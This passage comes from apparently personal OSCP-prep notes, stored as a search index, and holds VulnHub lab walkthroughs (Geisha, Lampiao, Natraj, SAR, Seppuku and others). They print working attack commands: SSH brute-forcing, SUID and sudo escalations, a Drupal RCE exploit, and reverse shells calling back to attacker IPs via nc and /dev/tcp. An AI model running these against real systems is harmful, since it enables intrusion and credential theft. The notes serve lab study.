(protocol 2.0)\n80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.38 ((Debian))\n</code></pre> <p>Nothing too interesting with the webserver, so I opted to brute-force ssh.</p> <pre><code>hydra -l gaara -P /usr/share/wordlists/rockyou.txt 192.168.1.146 ssh\n</code></pre> <p></p> <p>Found an interesting base64 encoded clue</p> <p></p> <p>decoded:</p> <p></p> <p>The clue points to this file, which seems to contain some encrypted data:</p> <p></p> <p>I couldn't figure out what cipher (if any) this is encrypted with. I also wasn't understanding the clues, but they appear to be based on a show Naruto.</p> <p>Linpeas finds an SUID</p> <p></p> <p>GTFOBins makes this easy</p> <pre><code>gdb -nx -ex 'python import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' -ex quit\n</code></pre> <p>root flag</p> <p></p>"},{"location":"OSCP-Prep/VulnHub/Geisha/","title":"Geisha","text":"<pre><code>192.168.1.133\n</code></pre>"},{"location":"OSCP-Prep/VulnHub/Geisha/#port-scan","title":"Port scan","text":"<pre><code>21/tcp   open  ftp      syn-ack ttl 64 vsftpd 3.0.3\n22/tcp   open  ssh      syn-ack ttl 64 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\n80/tcp   open  http     syn-ack ttl 64 Apache httpd 2.4.38 ((Debian))\n3389/tcp open  http     syn-ack ttl 64 nginx 1.14.2\n7080/tcp open  ssl/http syn-ack ttl 64 LiteSpeed httpd\n7125/tcp open  http     syn-ack ttl 63 nginx 1.17.10\n8088/tcp open  http     syn-ack ttl 64 LiteSpeed httpd\n9198/tcp open  http     syn-ack ttl 64 SimpleHTTPServer 0.6 (Python 2.7.16)\n</code></pre> <p>Dirbuster found a <code>passwd</code> file at </p> <pre><code>http://192.168.1.133:7125/passwd\n</code></pre> <p>Was able to brute force the <code>Geisha</code> user with hydra</p> <pre><code>hydra -l geisha -P /usr/share/wordlists/rockyou.txt 192.168.1.133 ssh \n</code></pre> <p></p> <p>linpeas.sh foudn that base32 has the SUID bit set</p> <p></p> <pre><code>LFILE=/etc/passwd &amp;&amp; base32 \"$LFILE\" | base32 --decode\n</code></pre> <p></p> <p>I fired up john and started to work on cracking the hash. It was taking a while so I starting thinking of other ways into root.</p> <p>Maybe there's an ssh key?</p> <pre><code>LFILE=/root/.ssh/id_rsa &amp;&amp; base32 \"$LFILE\" | base32 --decode\n</code></pre> <p>sure enough! </p> <p>I created the <code>id_rsa</code> file by copying the content and then set valid permissions on the file</p> <pre><code>chdmod 600\n</code></pre> <pre><code>ssh -i id_rsa root@localhost\n</code></pre> <p>I am ROOT!</p> <p></p>"},{"location":"OSCP-Prep/VulnHub/Inclusiveness/","title":"Inclusiveness","text":""},{"location":"OSCP-Prep/VulnHub/Inclusiveness/#port-scan","title":"Port scan","text":"<pre><code>21/tcp open  ftp     syn-ack ttl 64 vsftpd 3.0.3\n22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)\n80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.38 ((Debian))\n</code></pre> <p>Ftp allows anonymous login</p> <p>Dirbuster found <code>robots.txt</code> on port 80 but it is not allowing me to read view the content.</p> <p>There is a hint</p> <p></p> <p>I was able to bypass the restriction by forcing the User-Agent to be <code>Googlebot</code></p> <p></p> <p>Now we can see the content of robots.txt</p> <p></p> <p>The <code>/secret_information/</code> page has a few links that add a <code>lang</code> parameter to the URL.</p> <p>This parameter is vulnerable to LFI</p> <p></p> <p>I am able to upload to the ftp in <code>/pub/</code> which has a path of <code>/var/ftp/pub/</code> on the linux server.</p> <p></p> <p>Now do the same with a reverse php shell.</p> <p>This gives a shell as www-data</p> <p></p> <p>upgrade the shell</p> <pre><code>python -c 'import pty; pty.spawn(\"/bin/bash\")'\n</code></pre> <pre><code>export TERM=xterm\n</code></pre> <p>Found an interesting binary with SUID set <code>/home/tom/rootshell</code>.</p> <p>Reviewing the code it looks like I can get root if it thinks I'm tom. I just need to spoof the whois command.</p> <p>Fake <code>whois</code> with path injeciton.</p> <pre><code>echo \"printf 'tom'\"\" &gt; /tmp/whoami\n</code></pre> <p>Add /tmp to the path</p> <pre><code>export PATH=/tmp:$PATH\n</code></pre> <p>execute the SUID binary</p> <pre><code>/home/tom/rootshell\n</code></pre> <p>Now I have a shell as tom.</p> <p></p> <p>Tom can sudo everything with no password, so becoming root is as easy as <code>sudo su</code></p> <p></p> <p>I am root</p> <p></p>"},{"location":"OSCP-Prep/VulnHub/Katana/","title":"Katana","text":"<p>We found the IP using <code>netdiscover</code></p> <p>192.168.1.113</p>"},{"location":"OSCP-Prep/VulnHub/Katana/#port-80-apache","title":"Port 80 - Apache","text":"<p>on port 80 there is a webserver running with <code>bookstore CSE</code></p> <p></p> <p><code>searchsploit</code> found a few exploits we can try.</p> <p></p> <p>Tested EDB-48960 (login bypass via SQL injection) and it works exactly as described.</p> <p></p> <p></p> <p>Tested EDB-49314  POC 1 which displays a SQL Syntax error. Proof that this exploit is applicable to this instance of CSE Bookstore.</p> <p></p> <p>SQLmap was able to dump the db, but I haven't been albe to get a shell with it.</p> <pre><code>sqlmap -u http://192.168.1.113/ebook/bookPerPub.php?pubid=4 -p 'pubid' --dbms=mariadb --dump --os-shell\n</code></pre> <p>Cracked the admin password</p> <p></p>"},{"location":"OSCP-Prep/VulnHub/Katana/#port-7080","title":"Port  7080","text":"<p>run gobuster to enum port 7080</p>"},{"location":"OSCP-Prep/VulnHub/Katana/#port-8088","title":"Port 8088","text":"<p>Dirbuster found <code>phpinfo.php</code></p> <p></p> <p>Dirbuster found <code>upload.html</code> where we were able to upload a php paypload that gave us a reverse shell as the <code>www-data</code> user.</p> <p>Ran linpeas, which didn't find much. Looking at <code>/etc/passwd</code> we see the user <code>katana</code> has a hash in this file.</p> <pre><code>katana:$6$xHSuywb9JP8nPxSD$IdfUzMr6IAu3gAH0q7kdso5Xzh1DGjvoCtQ5Q2FPgjMRQcZ3BbsH.a35O1v8H.Cwj8.WDUdFD9Hmrnr2f2cun.:1000:1000:katana,,,:/home/katana:/bin/bash\n</code></pre>"},{"location":"OSCP-Prep/VulnHub/Katana/#initial-access","title":"Initial access","text":"<p>By OSINT (cheating) we found we coudl brute force <code>katana</code>s ssh password. Which happened to be <code>root</code></p> <p></p> <p>Once on the box we found a file in <code>/home/katana</code> called <code>.ssh_passwd</code>. The contents were</p> <p>katana@katana12345</p> <p>We then discover the SSH password <code>root</code> is differenet from the linux password for katana <code>katana12345</code>.</p>"},{"location":"OSCP-Prep/VulnHub/Katana/#privilege-escalation","title":"Privilege Escalation","text":"<p>Linpeas.sh finds capabilities on python</p> <p></p> <p>which is exploitable with the following command:</p> <pre><code>/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'\n</code></pre> <p></p> <p>Found the root flag</p> <p></p>"},{"location":"OSCP-Prep/VulnHub/Lampiano/","title":"Lampiao","text":""},{"location":"OSCP-Prep/VulnHub/Lampiano/#netdiscover","title":"Netdiscover","text":"<pre><code>192.168.1.141\n</code></pre>"},{"location":"OSCP-Prep/VulnHub/Lampiano/#port-scan","title":"Port scan","text":"<pre><code>22/tcp   open  ssh        syn-ack ttl 64 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0)\n80/tcp   open  tcpwrapped syn-ack ttl 64\n1898/tcp open  http       syn-ack ttl 64 Apache httpd 2.4.7 ((Ubuntu))\n\n</code></pre>"},{"location":"OSCP-Prep/VulnHub/Lampiano/#port-80","title":"Port 80","text":""},{"location":"OSCP-Prep/VulnHub/Lampiano/#port-1898","title":"Port 1898","text":"<p>Robots.txt has interesting entry: <code>Disallow/CHANGELOG.txt</code></p> <p></p> <p>Found an [exploit for drupal 7 &lt; 7.57] (https://github.com/pimps/CVE-2018-7600)</p>"},{"location":"OSCP-Prep/VulnHub/Lampiano/#rce-via-cve-2018-7600","title":"RCE via CVE-2018-7600","text":"<pre><code>./drupa7-CVE-2018-7600.py -c whoami http://lampiano:1898/\n</code></pre>"},{"location":"OSCP-Prep/VulnHub/Lampiano/#reverse-php-webshell","title":"Reverse php webshell","text":"<p>copy the binary to your working folder</p> <pre><code>cp /usr/share/webshells/php/php-reverse-shell.php .\n</code></pre> <p>Remove the comments and change IP/port</p> <p>host file on webserver</p> <pre><code>python3 -m http.server 82\n</code></pre> <p>Download to victim</p> <pre><code>./drupa7-CVE-2018-7600.py -c 'wget http://192.168.1.112:88/php-reverse-shell.php' http://lampiano:1898/\n</code></pre> <p>Activate the shell by visiting the webpage</p> <pre><code>http://lampiano:1898/shell.php\n</code></pre> <p>Fix the shell</p> <pre><code>python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n</code></pre> <pre><code>export TERM=xterm\n</code></pre>"},{"location":"OSCP-Prep/VulnHub/Lampiano/#linpeas-findings","title":"linPEAS findings","text":"<p>Found DB creds in <code>/var/www/html/sites/default/settings.php</code> </p> <p>Get on the SQL db</p> <pre><code>mysql -u drupaluser -pVirgulino\n</code></pre> <p>Dump the users table</p> <pre><code>+-------+---------------------------------------------------------+\n| name  | pass                                                    |\n+-------+---------------------------------------------------------+\n|       |                                                         |\n| tiago | $S$DNZ5o1k/NY7SUgtJvjPqNl40kHKwn4yXy2eroEnOAlpmT0TJ9Sx8 |\n| Eder  | $S$Dv5orvhi7okjmViImnVPmVgfwJ2U..PNK4E9IT/k7Lqz9GZRb7tY |\n| admin | $S$DQRp/JT8KnSM8cFRgzOlKL83DnHt6yxXieQ5hcq3me2bYeiA5p8A |\n+-------+---------------------------------------------------------+\n</code></pre> <p>Tried cracking the hashes to no aval. Drupal 7 hashes take forever to crack, so I had plenty of time to think. PASSWORD REUSE. I should have immediately tried to <code>su</code> with the db password.</p> <p></p> <p>At this point we can drop the webshell and switch to ssh if desired.</p>"},{"location":"OSCP-Prep/VulnHub/Lampiano/#linpeas-findings_1","title":"Linpeas findings","text":"<p>Linux Exploit Suggester picked up <code>Dirty Cow 2</code> as a possible exploit.</p> <pre><code>searchsploit -m 40839\n</code></pre> <p>Compile &amp; run on victim</p> <pre><code>g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil &amp;&amp; ./dcow -s\n</code></pre>"},{"location":"OSCP-Prep/VulnHub/Lampiano/#root-flag","title":"Root Flag","text":""},{"location":"OSCP-Prep/VulnHub/Lampiano/#additional-exploitation-methods","title":"Additional Exploitation methods","text":"<p>Able to break into <code>tiago</code> by scraping a detailed post and feeding all the words as a password through ssh. It only takes about 7 seconds to find the correct password this way. </p>"},{"location":"OSCP-Prep/VulnHub/Monitoring/","title":"Monitoring","text":"<p>We found the IP using <code>netdiscover</code></p> <pre><code>192.168.1.149\n</code></pre> <p>A port scan reveals port 80 is running a webserver. We see Nagios XI running on this webserver</p> <p></p> <p>We found a few public exploits for Nagios XI, some of which appear to require credentials.</p> <p>We tested EDB-44560 and EDB-49422 but neither seemed to work.</p> <p>Using the metasploit module <code>linux/http/nagios_xi_plugins_check_plugin_authenticated_rce</code> we were able to obtain a root shell using the following options</p> <p></p>"},{"location":"OSCP-Prep/VulnHub/Monitoring/#root-flag","title":"Root flag","text":""},{"location":"OSCP-Prep/VulnHub/Natraj/","title":"Natraj","text":"<pre><code>192.168.1.198\n</code></pre>"},{"location":"OSCP-Prep/VulnHub/Natraj/#port-scan","title":"Port scan","text":"<p>dirbuster found /console/ which has file.php in it.</p> <p>/console/file.php has an LFI vulnerability.</p> <p></p> <p>two of the users have interactive bash at login</p> <pre><code>root:x:0:0:root:/root:/bin/bash\nnatraj:x:1000:1000:natraj,,,:/home/natraj:/bin/bash\nmahakal:x:1001:1001:,,,:/home/mahakal:/bin/bash\n</code></pre> <p>put the users into a file called users.txt</p> <pre><code>hydra -l\n</code></pre> <pre><code>http://192.168.1.198/console/file.php?file=../../../../../../../var/log/auth.log&amp;cmd=rm%20/tmp/f;mkfifo%20/tmp/f;%20cat%20/tmp/f%20|%20/bin/sh%20-i%202%3E&amp;1%20|%20nc%20192.168.1.112%209999%20%3E%20/tmp/f\n</code></pre>"},{"location":"OSCP-Prep/VulnHub/Potato/","title":"Potato","text":"<p><code>netdiscover</code> find the box running on this IP</p> <pre><code>192.168.1.116\n</code></pre> <p>Port scan reveals port 80 (http) and 2112 (ftp).</p> <p>Found these files on ftp server</p> <p><code>index.php.bak</code></p> <pre><code>&lt;html&gt;                                                                                                        \n&lt;head&gt;&lt;/head&gt;                                                                                                 \n&lt;body&gt;                                                                                                        \n\n&lt;?php                                                                                                         \n\n$pass= \"potato\"; //note Change this password regularly                                                        \n\nif($_GET['login']===\"1\"){                                                                                     \n  if (strcmp($_POST['username'], \"admin\") == 0  &amp;&amp; strcmp($_POST['password'], $pass) == 0) {                  \n    echo \"Welcome! &lt;/br&gt; Go to the &lt;a href=\\\"dashboard.php\\\"&gt;dashboard&lt;/a&gt;\";                                  \n    setcookie('pass', $pass, time() + 365*24*3600);                                                           \n  }else{                                                                                                      \n    echo \"&lt;p&gt;Bad login/password! &lt;/br&gt; Return to the &lt;a href=\\\"index.php\\\"&gt;login page&lt;/a&gt; &lt;p&gt;\";               \n  }                                                                                                           \n  exit();                                                                                                     \n}\n?&gt;\n\n  &lt;form action=\"index.php?login=1\" method=\"POST\"&gt;\n                &lt;h1&gt;Login&lt;/h1&gt;\n                &lt;label&gt;&lt;b&gt;User:&lt;/b&gt;&lt;/label&gt;\n                &lt;input type=\"text\" name=\"username\" required&gt;\n                &lt;/br&gt;\n                &lt;label&gt;&lt;b&gt;Password:&lt;/b&gt;&lt;/label&gt;\n                &lt;input type=\"password\" name=\"password\" required&gt;\n                &lt;/br&gt;\n                &lt;input type=\"submit\" id='submit' value='Login' &gt;\n  &lt;/form&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>and </p> <p><code>welcome.msg</code> which didnt' have interesting content.</p> <p>After doing some research, we find that strcmp is not secure enough to use for login. We send the recommended payload which grants us access to the admin area</p> <p></p> <p></p> <p>We then find out a parameter which controls the logs page is vulnerable to directory traversal. WE are able to get <code>/etc/passwd</code></p> <pre><code>username=admin&amp;password[]=%22%22\n</code></pre> <p></p> <p></p> <p>From that file, we get the names of 3 users which can be used to spawn a shell session:</p> <pre><code>root:x:0:0:root:/root:/bin/bash\nflorianges:x:1000:1000:florianges:/home/florianges:/bin/bash\nwebadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:1001:1001:webadmin,,,:/home/webadmin:/bin/bash\n</code></pre> <p>We noticed the user <code>webadmin</code> has a hash in their entry. THis was cracked with hashcat and found to be</p> <pre><code>dragon\n</code></pre> <p>with <code>sudo -l</code></p> <p></p> <p>we found the user was allowed to run the below command as root</p> <pre><code>sudo /bin/nice /notes/*\n</code></pre> <p>we were able to use directory traversal to get an interactive bash session as root</p> <pre><code>sudo /bin/nice /notes/../../../../../bin/bash -i\n</code></pre>"},{"location":"OSCP-Prep/VulnHub/Potato/#root-flag","title":"Root flag","text":""},{"location":"OSCP-Prep/VulnHub/PyExp/","title":"PyExp","text":"<p>we found the IP <code>netdiscover</code></p> <pre><code>192.168.1.151\n</code></pre> <p>a port scan shows port 1337 (ssh) and 3306 (mysql 5.5.5)</p> <p>we were able to get the <code>root</code> user's password with a dictionary attack via hydra.</p> <pre><code>hydra -L scans/users -P /usr/share/wordlists/rockyou.txt 192.168.1.151 mysql -t4 -vv\n</code></pre> <p></p> <p>we were able to read arbitrary files with <code>mysql</code></p> <pre><code>select file_read('/etc/passwd');\n</code></pre> <pre><code>root:x:0:0:root:/root:/bin/bash                                                                                             \ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin                                                                               \nbin:x:2:2:bin:/bin:/usr/sbin/nologin                                                                                          \nsys:x:3:3:sys:/dev:/usr/sbin/nologin                                                                                          \nsync:x:4:65534:sync:/bin:/bin/sync                                                                                            \ngames:x:5:60:games:/usr/games:/usr/sbin/nologin                                                                               \nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin                                                                               \nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin                                                                                  \nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin                                                                                   \nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin                                                                             \nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin                                                                           \nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin                                                                                    \nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin                                                                          \nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin                                                                          \nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nsystemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:104:110::/nonexistent:/usr/sbin/nologin\nlucy:x:1000:1000:lucy,,,:/home/lucy:/bin/bash\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\nsshd:x:105:65534::/run/sshd:/usr/sbin/nologin\nmysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false\n</code></pre> <p>we also found some encrypted data in the <code>data.fernet</code> table.</p> <p>using the following python, we were able to decrypt it.</p> <pre><code>encrypted = b'gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys='\nkey = b'UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0='\n# Decryption\nfrom cryptography.fernet import Fernet\nf = Fernet(key)\ndecrypted = f.decrypt(encrypted)\nprint(\"Decrypted message: \")\nprint(decrypted.decode('utf-8'))\n</code></pre> <p>Our decrypted message is </p> <pre><code>lucy:wJ9`\"Lemdv9[FEw-\n</code></pre> <p>so user <code>lucy</code> and password is:</p> <pre><code>wJ9`\"Lemdv9[FEw-\n</code></pre> <p>this user can run <code>/opt/exp.py</code> as root with no password.</p> <p></p> <p>we checked the source code of <code>exp.py</code></p> <pre><code>uinput = raw_input('how are you?')\nexec(uinput)\n</code></pre> <p>This means we have direct python execution as the root user. We can abuse this in the following way:</p> <p>run <code>exp.py</code> with sudo</p> <pre><code>sudo /usr/bin/python2 /opt/exp.py\n</code></pre> <p>provide this malicious input which spawns a <code>root</code> bash session.</p> <pre><code>import os; os.setuid(0); os.system(\"/bin/bash\")\n</code></pre>"},{"location":"OSCP-Prep/VulnHub/PyExp/#root-flag","title":"Root flag","text":""},{"location":"OSCP-Prep/VulnHub/SAR/","title":"Sar","text":"<p><code>netdiscover</code> found the VM on this IP</p> <pre><code>192.168.1.145\n</code></pre>"},{"location":"OSCP-Prep/VulnHub/SAR/#port-80","title":"Port 80","text":"<p>Port scan reveals port 80 is running apache web server.</p> <p>The home page is just default apache site.</p>"},{"location":"OSCP-Prep/VulnHub/SAR/#php-info","title":"Php INFO","text":"<p>We found PHP info at <code>/phpinfo.php</code></p>"},{"location":"OSCP-Prep/VulnHub/SAR/#robotstxt","title":"robots.txt","text":"<p>We found an entry: <code>sar2HTML</code> in robots.txt</p> <p></p>"},{"location":"OSCP-Prep/VulnHub/SAR/#sar2html","title":"sar2HTML","text":"<p>The software version is displayed on home page.</p> <p></p> <p>we found EDB-49344 which gives us RCE as <code>www-data</code></p>"},{"location":"OSCP-Prep/VulnHub/SAR/#privesc","title":"Privesc","text":"<p><code>linpeas.sh</code> found an intersting entry in <code>crontab</code></p> <p></p> <p>Unfortunately, we can't modify <code>finally.sh</code>. But the contents of <code>finally.sh</code></p> <pre><code>#!/bin/sh\n\n./write.sh\n\n</code></pre> <p>leads us to a file we can modify: <code>write.sh</code></p> <p>we replace the existing file with a malicious script:</p> <pre><code>#!/bin/bash\n\nbash -i &gt;&amp; /dev/tcp/192.168.1.109/443 0&gt;&amp;1\n</code></pre>"},{"location":"OSCP-Prep/VulnHub/SAR/#root-flag","title":"Root flag","text":"<p>And we got root!</p> <p></p>"},{"location":"OSCP-Prep/VulnHub/Seppuku/","title":"Seppuku","text":"<p><code>netdiscover</code> found the box running on this IP</p> <pre><code>192.168.1.181\n</code></pre>"},{"location":"OSCP-Prep/VulnHub/Seppuku/#port-scan","title":"Port scan","text":"<pre><code>PORT     STATE SERVICE     REASON         VERSION\n21/tcp   open  ftp         syn-ack ttl 64 vsftpd 3.0.3\n22/tcp   open  ssh         syn-ack ttl 64 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\n| ssh-hostkey: \n|   2048 cd:55:a8:e4:0f:28:bc:b2:a6:7d:41:76:bb:9f:71:f4 (RSA)\n| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDhKnaNVJ/YnScPD1GDZSIfyC/a4jjHhSnoEgi2c/c03kE4JVZbA4cTFeEHGq4PFTyiuchv9w9zNu8XtVIDhILb9K4D38EssujmpekrrAnYkS0yU8Kqas1+3FCY8xjz6a5yVdMk/aQVa4BfFXWnv+rdlio0ZFVdLDaRaG90KMUEVw18Ogzt9lBbnbf7gOR0EGPKW0xzyDyI70u5FJnarDFV9jCZL/flcCL0m+MAycgdFyFqCOTjNxd8Qn2R3rnhgjSER5C9c+qEI/htLmtnXTC0p6AMeTDjO3J57LEB1WFYJ4wkeuEUtPadfhwgDR16XqWmqw2HcBIj1W9H9V47KFfR\n|   256 16:fa:29:e4:e0:8a:2e:7d:37:d2:6f:42:b2:dc:e9:22 (ECDSA)\n| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBC+yj9GRgyn2boC7Dw9un6PEwviM8NZ1CRTjmrHRFiOT+0co+OOwxD5RRQCxuS22zJgsiDIEka8ypTjYWlnJ9T8=\n|   256 bb:74:e8:97:fa:30:8d:da:f9:5c:99:f0:d9:24:8a:d5 (ED25519)\n|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIESejQ038eElmlRfbqAgaRSK120jvrz9WQ5UcjxJdJ71\n80/tcp   open  http        syn-ack ttl 64 nginx 1.14.2\n|_http-server-header: nginx/1.14.2\n|_http-title: 401 Authorization Required\n| http-auth: \n| HTTP/1.1 401 Unauthorized\\x0D\n|_  Basic realm=Restricted Content\n139/tcp  open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n445/tcp  open  netbios-ssn syn-ack ttl 64 Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)\n8088/tcp open  http        syn-ack ttl 64 LiteSpeed httpd\n|_http-server-header: LiteSpeed\n|_http-title: Seppuku\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\nMAC Address: 00:0C:29:B1:65:81 (VMware)\n\n</code></pre>"},{"location":"OSCP-Prep/VulnHub/Seppuku/#enumeration","title":"Enumeration","text":"<p>We weren't able to anonymous login with ftp</p> <p>Port 80 requires authentication, we tried a few basic combinations such as     - admin:admin     - admin:password     - root:root     - root:password</p> <p></p> <p>Anonymous login wasn't allowed on the Samba Share</p> <p>Port 8088 didn't have anything interesting</p> <p>we found some interesting files</p> <p></p> <p>We were able to crack the <code>shadow.bak</code> file pretty quickly with hashcat and the supplied wordlist. However, the username is <code>rabbit-hole</code> and these credentials don't appear to work anywhere.</p> <p></p> <p>We also tried using some RSA tokens that we found in <code>/keys/</code></p> <p></p> <p>This also led nowhere.</p> <p>Next I threw the password list at ssh using the hostname of the box as the user (this has been a common pattern in the past).</p> <pre><code>hydra -l 'seppuku' -P ../loot/password.lst 192.168.1.181 ssh\n</code></pre> <p>This gives us a way in</p> <p></p> <pre><code>seppuku\n</code></pre> <pre><code>eeyoree\n</code></pre>"},{"location":"OSCP-Prep/VulnHub/Seppuku/#privesc","title":"Privesc","text":"<p>We start with some manual enumeration, and notice the user is able to run <code>/usr/bin/ln -sf /root/ /tmp/</code> as root with no password.</p> <p></p> <p>Running the command copies the whole /root/ directory into /tmp so we can view the files.</p> <pre><code>sudo /usr/bin/ln -sf /root/ /tmp/\n</code></pre> <p>we then try to move to the folder to see the files</p> <pre><code>cd /tmp\n</code></pre> <p>we see we're in a restricted rbash session</p> <p></p> <p>we can easily escape this with</p> <pre><code>bash -i\n</code></pre> <p>but we don't have permissions to view the /tmp/root directory</p>"},{"location":"OSCP-Prep/VulnHub/Seppuku/#linpeas","title":"Linpeas","text":"<p>at this point we decided to turn to linpeas, here are some of the findings</p>"},{"location":"OSCP-Prep/VulnHub/Seppuku/#sudo-version-1827","title":"sudo version 1.8.27","text":""},{"location":"OSCP-Prep/VulnHub/Seppuku/#nginx-htpasswd","title":"nginx htpasswd","text":"<pre><code>admin:$apr1$sHVvV4Vi$FFQ2lYSWSsNM/gDRPXPgr1\n</code></pre> <p>Hashcat and crackstation didn't automatically recognize this hash type, though we were able to see it's similar to <code>Apache</code> which is mode 1600 on the example hashes page</p> <p>we also needed to modify the hash file so it only contained the hash and NOT the username:</p> <pre><code>$apr1$sHVvV4Vi$FFQ2lYSWSsNM/gDRPXPgr1\n</code></pre> <pre><code>hashcat -m 1600 hash password.lst\n</code></pre> <p></p> <p>credentials</p> <pre><code>admin\n</code></pre> <pre><code>Football\n</code></pre>"},{"location":"OSCP-Prep/VulnHub/Seppuku/#id_rsapub","title":"id_rsa.pub","text":"<pre><code>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKkmXCMpd/QXhi8vaB/C+hS68Ht+4Ywx8J7jWAsKxOyV45TLYIlf6g3BVUo+mXpNgjidc8ZuLB8bOjGbQVlrsP3K\nvzc6DC68wynzc6RVzAv2/7Htq0rwABVnQ2O848aS8SEHas9LaYqDXFEpcIzukDQpI6gNuT1yg6lp2ODgbR/Vg9avCnqIt8gSt9jb7mFLtDJNCm5GYe5Hh4osXU0VGn\nyBi40JW2vSfZS7qFa4jtFYEZBkkmiPwsqN9FFiYoanKqIZN1HL7zILIC5PnmyG4LNe5z7/ccTaMAI4Pz6lI8qPDHObh+5pJ8FNSQd/KGJIoiSinZh8gMspE8zx0afn\nO5\n</code></pre> <p>This gives an idea to try to <code>private</code> key we found earlier for this user. It works!</p>"},{"location":"OSCP-Prep/VulnHub/Seppuku/#lateral-movement-to-user-tanto","title":"lateral movement to user: tanto","text":"<pre><code>ssh -i private tanto@192.168.1.181\n</code></pre> <p>This user was also in a restricted shell, we need to escape with</p> <pre><code>bash -i\n</code></pre> <p>after some manual enumeration and running linpeas, it doesn't appear that we have any new permissions as this user</p>"},{"location":"OSCP-Prep/VulnHub/Seppuku/#users-with-console","title":"users with console","text":""},{"location":"OSCP-Prep/VulnHub/Seppuku/#interesting-files-in-home-directory","title":"interesting files in home directory","text":"<pre><code>12345685213456!@!@A\n</code></pre> <p>Turns out, this is a clear-text backup of a password for the user <code>samurai</code></p> <pre><code>su samurai\n</code></pre> <p>paste the password</p> <p>samurai is allowed to run the following with elevated privileges</p> <pre><code>/../../../../../../home/tanto/.cgi_bin/bin /tmp/*\n</code></pre> <p></p> <p>after reviewing linpeas results, it appears the only access gained was the above sudo command.</p> <p>I tried running the command, but the path <code>/home/tanto/.gci_bin/bin</code> does not exist. Since we have access as tanto through an ssh-key, we log in and create a copy of <code>ls</code> at that path</p> <pre><code>ssh -i private tanto@192.168.1.181\n</code></pre> <p>break out of rbash</p> <pre><code>bash -i\n</code></pre> <p>copy the <code>ls</code> binary</p> <pre><code>mkdir /home/tanto/.cgi_bin/ &amp;&amp; cp /usr/bin/ls $HOME/.cgi_bin/bin\n</code></pre> <p>then, in a different shell running as <code>samurai</code>, run the binary with sudo and <code>ls</code> the <code>/tmp/root</code> directory</p> <pre><code>sudo /../../../../../../home/tanto/.cgi_bin/bin /tmp/root\n</code></pre> <p>we see <code>root.txt</code>, but lets try to get a session as root. I wonder if there are any ssh keys.</p> <pre><code>sudo /../../../../../../home/tanto/.cgi_bin/bin /tmp/root/.ssh\n</code></pre> <p></p> <p>now, we can view the key by replacing our sudo binary with the <code>cat</code> command, again running in a session as the <code>tanto</code> user</p> <pre><code>mkdir /home/tanto/.cgi_bin/ &amp;&amp; cp /usr/bin/cat $HOME/.cgi_bin/bin\n</code></pre> <pre><code>sudo /../../../../../../home/tanto/.cgi_bin/bin /tmp/root/.ssh/id_rsa &gt; root_rsa\n</code></pre> <p>we then copy the file over to our kali box.</p> <p>the rsa key worked! We're able to log in as root now using ssh.</p> <pre><code>ssh -i root_rsa root@192.168.1.181\n</code></pre> <p></p>"},{"location":"OSCP-Prep/VulnHub/Seppuku/#root-flag","title":"Root flag","text":"<pre><code>{SunCSR_Seppuku_2020_X}\n</code></pre>"},{"location":"OSCP-Prep/VulnHub/Solstice/","title":"Solstice","text":"<p>netdiscover found the VM runnin on this IP</p> <pre><code>192.168.1.191\n</code></pre>"},{"location":"OSCP-Prep/VulnHub/Solstice/#service-enumeration","title":"Service enumeration","text":""},{"location":"OSCP-Prep/VulnHub/Solstice/#pyftpdlib-156-ports-21-and-2121","title":"Pyftpdlib 1.5.6 ports 21 and 2121","text":"<p>tested anonymous (ftp:ftp) login - didn't work.</p>"},{"location":"OSCP-Prep/VulnHub/Solstice/#exim-smtp-492","title":"Exim smtp 4.9.2","text":"<p>THis is running on port 25; we didn't find any valid accounts with <code>vrfy</code> wordlist 